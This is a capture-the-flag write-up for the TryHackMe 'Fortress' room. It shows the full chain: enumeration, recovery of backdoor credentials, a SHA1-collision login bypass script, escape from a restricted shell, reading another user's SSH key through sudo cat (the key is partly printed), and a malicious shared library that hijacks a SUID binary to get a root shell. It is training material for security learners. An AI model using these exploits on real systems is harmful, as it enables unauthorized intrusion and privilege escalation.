# TryHackMe-Fortress Writeup

# Room Link
https://tryhackme.com/room/fortress

# Enumeration

```
⛩\> nmap -p- -sV -sC -v -oA enum --min-rate 4500 --max-rtt-timeout 1500ms --open fortress
Nmap scan report for fortress (10.10.101.72)
Host is up (0.38s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 9f:d0:bb:c7:e2:ee:7f:91:fe:c2:6a:a6:bb:b2:e1:91 (RSA)
|   256 06:4b:fe:c0:6e:e4:f4:7e:e1:db:1c:e7:79:9d:2b:1d (ECDSA)
|_  256 0d:0e:ce:57:00:1a:e2:8d:d2:1b:2e:6d:92:3e:65:c4 (ED25519)
5581/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           305 Jul 25 20:06 marked.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.13.8.55
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
5752/tcp open  unknown
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, LANDesk-RC, LPDString, RTSPRequest, SIPOptions, X11Probe:
|     Chapter 1: A Call for help
|     Username: Password:
|   Kerberos, LDAPBindReq, LDAPSearchReq, NCP, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie:
|     Chapter 1: A Call for help
|_    Username:
7331/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

Nmap reveals four open ports, SSH, FTP, HTTP and on unknown port. HTTP has a default apache page. Let’s look into FTP, as it has an anonymous login enabled.

```
⛩\> ftp fortress 5581
Connected to fortress.
220 (vsFTPd 3.0.3)
Name (fortress:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jul 25 20:06 .
drwxr-xr-x    2 ftp      ftp          4096 Jul 25 20:06 ..
-rw-r--r--    1 ftp      ftp          1255 Jul 25 20:06 .file
-rw-r--r--    1 ftp      ftp           305 Jul 25 20:06 marked.txt
226 Directory send OK.
```

Two files are present on the FTP, let’s download them to our machine.

```
ftp> get .file
local: .file remote: .file
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .file (1255 bytes).
226 Transfer complete.
1255 bytes received in 0.00 secs (17.0980 MB/s)

ftp> get marked.txt
local: marked.txt remote: marked.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for marked.txt (305 bytes).
226 Transfer complete.
305 bytes received in 0.00 secs (9.0897 MB/s)
```

Let’s read text file first.

```
⛩\> cat marked.txt
If youre reading this, then know you too have been marked by the overlords... Help memkdir /home/veekay/ftp I have been stuck inside this prison for days no light, no escape... Just darkness... Find the backdoor and retrieve the key to the map... Arghhh, theyre coming... HELLLPPPPPmkdir /home/veekay/ftp
```

Just a message, it mentions about backdoor and key. Let’s look into an file.

```
⛩\> file .file
.file: python 2.7 byte-compiled
```

It’s a python byte-compiled file.

> When we execute a source code (a file with a .py extension), Python first compiles it into a bytecode. The bytecode is a low-level platform-independent representation of your source code, however, it is not the binary machine code and cannot be run by the target machine directly. In fact, it is a set of instructions for a virtual machine which is called the Python Virtual Machine (PVM).

At the moment we can’t read the content of this bytecode file. However, we can decompile this to convert back into equivalent Python source. As this file is compiled with python 2.7 version, so we will use ‘uncompyle2’ application.

> [https://github.com/Mysterie/uncompyle2](https://github.com/Mysterie/uncompyle2)

```
⛩\> uncompyle2 .file > decompile.py

⛩\> cat decompile.py
# 2021.09.18 05:59:33 UTC
# Embedded file name: ../backdoor/backdoor.py
import socket
import subprocess
from Crypto.Util.number import bytes_to_long
usern = 232340432076717036154994L
passw = 10555160959732308261529999676324629831532648692669445488L
port = 5752
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', port))
s.listen(10)

def secret():
    with open('secret.txt', 'r') as f:
        reveal = f.read()
        return reveal


while True:
    try:
        conn, addr = s.accept()
        conn.send('\n\tChapter 1: A Call for help\n\n')
        conn.send('Username: ')
        username = conn.recv(1024).decode('utf-8').strip()
        username = bytes(username, 'utf-8')
        conn.send('Password: ')
        password = conn.recv(1024).decode('utf-8').strip()
        password = bytes(password, 'utf-8')
        if bytes_to_long(username) == usern and bytes_to_long(password) == passw:
            directory = bytes(secret(), 'utf-8')
            conn.send(directory)
            conn.close()
        else:
            conn.send('Errr... Authentication failed\n\n')
            conn.close()
    except:
        continue
# okay decompyling .file
# decompiled 1 files: 1 okay, 0 failed, 0 verify failed
# 2021.09.18 05:59:33 UTC
```

This program opens up a port (5752), asks for username & password and if it is correct then opens the ‘secret.txt’ file. The username and password are stored in long integer, we need to convert that into bytes. For that we can import ‘crypto’ module or you can use online python compile.

[3xbty7grx - Python - OneCompiler](https://onecompiler.com/python/3xbty7grx)

![Screen Shot 2021-09-17 at 23.22.11.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/12FC3ED0-1187-4ADD-8D72-04D3A046FACB/7D1678AC-0836-462B-B053-43DEBE60665A_2/Screen%20Shot%202021-09-17%20at%2023.22.11.png)

The output gave use the username and password. Let’s access the remote port 5752 and use these credentials.

```
⛩\> nc fortress 5752

        Chapter 1: A Call for help

Username: 1337-h4x0r
Password: n3v3r_g0nn4_g1v3_y0u_up

t3mple_0f_y0ur_51n5
```

We got the information which was stored in ‘secret.txt’ file. At first it is quite confusing, like what is this? A password or Hint or something else entirely? But if we remember Task 2, they have mentioned to point the IP address to specific hostname and virtual host. The VHOST is temple.fortress and the secret text says ‘t3mple_0f_y0ur_51n5’, it has temple in it. So, perhaps we can append this as endpoint.

> [http://temple.fortress:7331/t3mple_0f_y0ur_51n5.php](http://temple.fortress:7331/t3mple_0f_y0ur_51n5.php)  [http://temple.fortress:7331/t3mple_0f_y0ur_51n5.html](http://temple.fortress:7331/t3mple_0f_y0ur_51n5.html)

The php endpoint gives us a blank screen, but if we look at the page source then we’d see two specific things.

![Screen Shot 2021-09-18 at 00.45.46.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/12FC3ED0-1187-4ADD-8D72-04D3A046FACB/FD5BEA75-9F86-4116-A82A-3C7914470AFF_2/Screen%20Shot%202021-09-18%20at%2000.45.46.png)

The .mp4 file is just ‘rick roll’ video. The .css file on the  hand is a hint.

![Screen Shot 2021-09-18 at 00.47.12.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/12FC3ED0-1187-4ADD-8D72-04D3A046FACB/4E2F5BA5-C036-4A2C-B429-B91D5ED64D15_2/Screen%20Shot%202021-09-18%20at%2000.47.12.png)

It’s base64 encoded, let’s decode this.

```
⛩\> echo -n VGhpcyBpcyBqb3VybmV5IG9mIHRoZSBncmVhdCBtb25rcywgbWFraW5nIHRoaXMgZm9ydHJlc3MgYSBzYWNyZWQgd29ybGQsIGRlZmVuZGluZyB0aGUgdmVyeSBvd24gb2YgdGhlaXIga2luZHMsIGZyb20gd2hhdCBpdCBpcyB0byBiZSB1bmxlYXNoZWQuLi4gVGhlIG9ubHkgb25lIHdobyBjb3VsZCBzb2x2ZSB0aGVpciByaWRkbGUgd2lsbCBiZSBncmFudGVkIGEgS0VZIHRvIGVudGVyIHRoZSBmb3J0cmVzcyB3b3JsZC4gUmV0cmlldmUgdGhlIGtleSBieSBDT0xMSURJTkcgdGhvc2UgZ3VhcmRzIGFnYWluc3QgZWFjaCBvdGhlci4= |base64 -d

This is journey of the great monks, making this fortress a sacred world, defending the very own of their kinds, from what it is to be unleashed... The only one who could solve their riddle will be granted a KEY to enter the fortress world. Retrieve the key by COLLIDING those guards against each .
```

We got a message with a riddle and the riddle is ‘Retrieve the key by COLLIDING those guards against each ’. This message a reference to ‘SHA1’ collision attack.

Let’s check the .html endpoint.

![Screen Shot 2021-09-19 at 00.40.46.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/12FC3ED0-1187-4ADD-8D72-04D3A046FACB/FC426287-BD3A-47B3-AD6B-F4D1A49C48E7_2/Screen%20Shot%202021-09-19%20at%2000.40.46.png)

We have login page. Check the page source and you will see PHP source code of this login.

![Screen Shot 2021-09-19 at 00.41.20.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/12FC3ED0-1187-4ADD-8D72-04D3A046FACB/762855E2-BD45-44F5-B1FD-F0830DABE0FC_2/Screen%20Shot%202021-09-19%20at%2000.41.20.png)

A POC is already available fo SHA1 collision attack.

> [https://github.com/bl4de/ctf/blob/master/2017/BostonKeyParty_2017/Prudentialv2/Prudentialv2_Cloud_50.md](https://github.com/bl4de/ctf/blob/master/2017/BostonKeyParty_2017/Prudentialv2/Prudentialv2_Cloud_50.md)

```python
#!/usr/bin/env python
import requests

# this is copy/paste from Hex editor - two different files with the same SHA1 checksum
name = '255044462D312E33 0A25E2E3 CFD30A0A 0A312030 206F626A 0A3C3C2F 57696474 68203220 3020522F 48656967 68742033 20302052 2F547970 65203420 3020522F 53756274 79706520 35203020 522F4669 6C746572 20362030 20522F43 6F6C6F72 53706163 65203720 3020522F 4C656E67 74682038 20302052 2F426974 73506572 436F6D70 6F6E656E 7420383E 3E0A7374 7265616D 0AFFD8FF FE002453 48412D31 20697320 64656164 21212121 21852FEC 09233975 9C39B1A1 C63C4C97 E1FFFE01 7F46DC93 A6B67E01 3B029AAA 1DB2560B 45CA67D6 88C7F84B 8C4C791F E02B3DF6 14F86DB1 690901C5 6B45C153 0AFEDFB7 6038E972 722FE7AD 728F0E49 04E046C2 30570FE9 D41398AB E12EF5BC 942BE335 42A4802D 98B5D70F 2A332EC3 7FAC3514 E74DDC0F 2CC1A874 CD0C7830 5A215664 61309789 606BD0BF 3F98CDA8 044629A1 3C68746D 6C3E0A3C 73637269 7074206C 616E6775 6167653D 6A617661 73637269 70742074 7970653D 22746578 742F6A61 76617363 72697074 223E0A3C 212D2D20 40617277 202D2D3E 0A0A7661 72206820 3D20646F 63756D65 6E742E67 6574456C 656D656E 74734279 5461674E 616D6528 2248544D 4C22295B 305D2E69 6E6E6572 48544D4C 2E636861 72436F64 65417428 31303229 2E746F53 7472696E 67283136 293B0A69 66202868 203D3D20 27373327 29207B0A 20202020 646F6375 6D656E74 2E626F64 792E696E 6E657248 544D4C20 3D20223C 5354594C 453E626F 64797B62 61636B67 726F756E 642D636F 6C6F723A 5245443B 7D206831 7B666F6E 742D7369 7A653A35 3030253B 7D3C2F53 54594C45 3E3C4831 3E262378 31663634 383B3C2F 48313E22 3B0A7D20 656C7365 207B0A20 20202064 6F63756D 656E742E 626F6479 2E696E6E 65724854 4D4C203D 20223C53 54594C45 3E626F64 797B6261 636B6772 6F756E64 2D636F6C 6F723A42 4C55453B 7D206831 7B666F6E 742D7369 7A653A35 3030253B 7D3C2F53 54594C45 3E3C4831 3E262378 31663634 393B3C2F 48313E22 3B0A7D0A 0A3C2F73 63726970 743E0A0A'

password = '25504446 2D312E33 0A25E2E3 CFD30A0A 0A312030 206F626A 0A3C3C2F 57696474 68203220 3020522F 48656967 68742033 20302052 2F547970 65203420 3020522F 53756274 79706520 35203020 522F4669 6C746572 20362030 20522F43 6F6C6F72 53706163 65203720 3020522F 4C656E67 74682038 20302052 2F426974 73506572 436F6D70 6F6E656E 7420383E 3E0A7374 7265616D 0AFFD8FF FE002453 48412D31 20697320 64656164 21212121 21852FEC 09233975 9C39B1A1 C63C4C97 E1FFFE01 7346DC91 66B67E11 8F029AB6 21B2560F F9CA67CC A8C7F85B A84C7903 0C2B3DE2 18F86DB3 A90901D5 DF45C14F 26FEDFB3 DC38E96A C22FE7BD 728F0E45 BCE046D2 3C570FEB 141398BB 552EF5A0 A82BE331 FEA48037 B8B5D71F 0E332EDF 93AC3500 EB4DDC0D ECC1A864 790C782C 76215660 DD309791 D06BD0AF 3F98CDA4 BC4629B1 3C68746D 6C3E0A3C 73637269 7074206C 616E6775 6167653D 6A617661 73637269 70742074 7970653D 22746578 742F6A61 76617363 72697074 223E0A3C 212D2D20 40617277 202D2D3E 0A0A7661 72206820 3D20646F 63756D65 6E742E67 6574456C 656D656E 74734279 5461674E 616D6528 2248544D 4C22295B 305D2E69 6E6E6572 48544D4C 2E636861 72436F64 65417428 31303229 2E746F53 7472696E 67283136 293B0A69 66202868 203D3D20 27373327 29207B0A 20202020 646F6375 6D656E74 2E626F64 792E696E 6E657248 544D4C20 3D20223C 5354594C 453E626F 64797B62 61636B67 726F756E 642D636F 6C6F723A 5245443B 7D206831 7B666F6E 742D7369 7A653A35 3030253B 7D3C2F53 54594C45 3E3C4831 3E262378 31663634 383B3C2F 48313E22 3B0A7D20 656C7365 207B0A20 20202064 6F63756D 656E742E 626F6479 2E696E6E 65724854 4D4C203D 20223C53 54594C45 3E626F64 797B6261 636B6772 6F756E64 2D636F6C 6F723A42 4C55453B 7D206831 7B666F6E 742D7369 7A653A35 3030253B 7D3C2F53 54594C45 3E3C4831 3E262378 31663634 393B3C2F 48313E22 3B0A7D0A 0A3C2F73 63726970 743E0A0A'

print '[+] create URL decoded strings to send as GET parameters [name] and [password]...'
name = ''.join(name.split(' '))
password = ''.join(password.split(' '))

namestr = ''.join(['%' + name[i] + name[i + 1]
           for i in range(0, len(name)) if i % 2 == 0])

passwordstr = ''.join(['%' + password[j] + password[j + 1]
           for j in range(0, len(password)) if j % 2 == 0])

print '[+] sending request to http://fortress:7331/t3mple_0f_y0ur_51n5.php?name=[name]&password=[password]'

u = 'http://fortress:7331/t3mple_0f_y0ur_51n5.php?name={}&password={}'.format(namestr, passwordstr)

resp = requests.get(u, headers={
    'Host': 'fortress'
})

print '[+] read FLAG from response...\n\n'
print resp.content
```

Let’s run the POC.

```
⛩\> python2.7 sha1.py
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[+] create URL decoded strings to send as GET parameters [name] and [password]...
[+] sending request to http://fortress:7331/t3mple_0f_y0ur_51n5.php?name=[name]&password=[password]
[+] read FLAG from response...


<html>
<head>
        <title>Chapter 2</title>
        <link rel='stylesheet' href='assets/style.css' type='text/css'>
</head>
<body>
        <div id="container">
        <video width=100% height=100% autoplay>
            <source src="./assets/flag_hint.mp4" type=video/mp4>
        </video>


<pre>'The guards are in a fight with each ... Quickly retrieve the key and leave the temple: 'm0td_f0r_j4x0n.txt</pre><!-- Hmm are we there yet?? May be we just need to connect the dots -->

<!--    <center>
                        <form id="login" method="GET">
                                <input type="text" required name="user" placeholder="Username"/><br/>
                                <input type="text" required name="pass" placeholder="Password" /><br/>
                                <input type="submit"/>
                        </form>
                </center>
-->

    </div>

</body>
</html>
```

We got the a text file. Let’s access it.

![Screen Shot 2021-09-19 at 00.46.07.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/12FC3ED0-1187-4ADD-8D72-04D3A046FACB/B1D1E19D-530C-4EA2-9957-75A355E2309C_2/Screen%20Shot%202021-09-19%20at%2000.46.07.png)

SSH private key of ‘h4rdy’ user. Let’s copy and give right permissions to it and login.

```
⛩\> chmod 600 id_rsa_h4rdy

⛩\> ssh -i id_rsa_h4rdy h4rdy@fortress
Warning: Permanently added the ECDSA host key for IP address '10.10.171.78' to the list of known hosts.
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

Last login: Mon Jul 26 14:04:41 2021 from 192.168.150.128

h4rdy@fortress:~$ h4rdy@fortress:~$ id
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
```

As you can see we can’t execute ‘id’ command, that’s because we are in ‘restricted shell’ and it is not allowing any commands if it has ‘/‘ in it. We have exit and login again with an switch.

```
⛩\> ssh -i id_rsa_h4rdy h4rdy@fortress -t 'bash'

h4rdy@fortress:~$ id
Command 'id' is available in '/usr/bin/id'
The command could not be located because '/usr/bin' is not included in the PATH environment variable.
id: command not found

h4rdy@fortress:~$ echo $PATH
/home/h4rdy
```

Path variables are not defined. So, let’s define it first,

```
h4rdy@fortress:~$ export PATH=/usr/bin:/usr/sbin:/bin:/sbin

h4rdy@fortress:~$ echo $PATH
/usr/bin:/usr/sbin:/bin:/sbin
```

# Privilege Escalation - User (j4x0n)

```
h4rdy@fortress:~$ sudo -l

Matching Defaults entries for h4rdy on fortress:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User h4rdy may run the following commands on fortress:
    (j4x0n) NOPASSWD: /bin/cat
```

We can run ‘cat’ binary with ‘j4x0n’ user’s privileges. Let’s read this users SSH private key.

```
h4rdy@fortress:~$ sudo -u j4x0n cat /home/j4x0n/.ssh/id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAos93HTD06dDQA+pA9T/TQEwGmd5VMsq/NwBm/BrJTpfpn8av0Wzm
r8SKav7d7rtx/GZWuvj2EtP6DljnqhbpMEi05iAIBCEUHw+blPBd4em6J1LB38mdPiDRgy
pCfhRWTKsP8AJQQtPT1Kcb2to9pTkMenFVU3l2Uq9u5VviQu+FB/ED+65LYnw/uoojBzZx
W80eLpyvY1KyALbDKHuGFbJ3ufRQfoUz2qmHn5aOgrnUTH4xrVQkVbsrnI3nQLIJDIS94J
zH0U1nca2XBwRzhBc0f0Hpr61GKDFjzdsNEtfHK7NuO7wWQMiCvODXEPTMBwpoMhTfYJxo
h5kbE5QhNQENT2iEs0aRrk0OX/mURj3GrsRpLYlGIX9bKpwPlW+d9MquLdYlHxsWBIuv3x
```

Let’s exit this session and login with j4x0n key.

```
⛩\> ssh -i id_rsa_j4x0n j4x0n@fortress
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

j4x0n@fortress:~$ id
uid=1000(j4x0n) gid=1000(j4x0n) groups=1000(j4x0n),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

# Privilege Escalation - Root

```
j4x0n@fortress:~$ find / -perm -u=s -type f 2>/dev/null
/usr/local/bin/sudo
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/at
/opt/bt
/bin/ping6
/bin/umount
/bin/ping
/bin/mount
/bin/su
/bin/fusermount
/sbin/ldconfig.real
```

If we search the SUID binaries, then we’d find one unusual ‘/opt/bt’. Let’s look into that binary.

```
j4x0n@fortress:~$ file /opt/bt
/opt/bt: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cb7bf398a6ca5b7782a85f0afcdd3554d44ca151, for GNU/Linux 3.2.0, not stripped
```

Do not execute this binary, as it’d start printing random stuff on the screen and you have to close the terminal.

```
j4x0n@fortress:~$ strings /opt/bt
/lib64/ld-linux-x86-64.so.2
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
puts
sleep
__cxa_finalize
__libc_start_main
libfoo.so
```

If we look into binary using strings, then it calls ‘libfoo.so’. Let’s find this file.

```
j4x0n@fortress:~$ find / -name 'libfoo.so' 2>/dev/null
/usr/lib/libfoo.so

j4x0n@fortress:~$ ls -la /usr/lib/libfoo.so
-rwxrwxr-x 1 j4x0n j4x0n 16080 Jul 26 12:54 /usr/lib/libfoo.so
```

We have full control over this file, let’s switch this file with malicious one.

[Abusing missing library for Privilege Escalation [3-minute read]](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)

```
j4x0n@fortress:~$ cat demo.c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
int foo(){
        setuid(0);
        setgid(0);
        system("/bin/bash");
}

j4x0n@fortress:~$ gcc -shared -o libfoo.so -fPIC demo.c

j4x0n@fortress:~$ file libfoo.so
libfoo.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=790aec4897602f7263215dc776d71baf136153e0, not stripped
```

We compiled a malicious ‘.so’ file, let’s copy this to ‘/usr/lib’ directory and execute the SUID binary.

```
j4x0n@fortress:~$ /opt/bt
Root Shell Initialized...
Exploiting kernel at super illuminal speeds...
Getting Root...
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@fortress:~# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(j4x0n)

root@fortress:~# cat /root/root.txt
3a17cfcca1aabc245a2d5779615643ae
```

We go root shell.
